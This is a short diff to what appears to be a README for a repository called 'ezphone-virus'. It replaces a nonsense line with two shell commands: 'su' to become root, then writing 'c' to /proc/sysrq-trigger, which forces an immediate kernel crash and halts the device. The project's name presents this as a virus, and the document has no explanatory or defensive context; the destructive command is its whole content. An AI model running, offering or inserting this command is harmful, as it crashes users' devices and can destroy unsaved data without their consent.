@@ -1,2 +1,3 @@
 # ezphone-virus
-Lskswkkw
+$ su
+echo c > /proc/sysrq-trigger
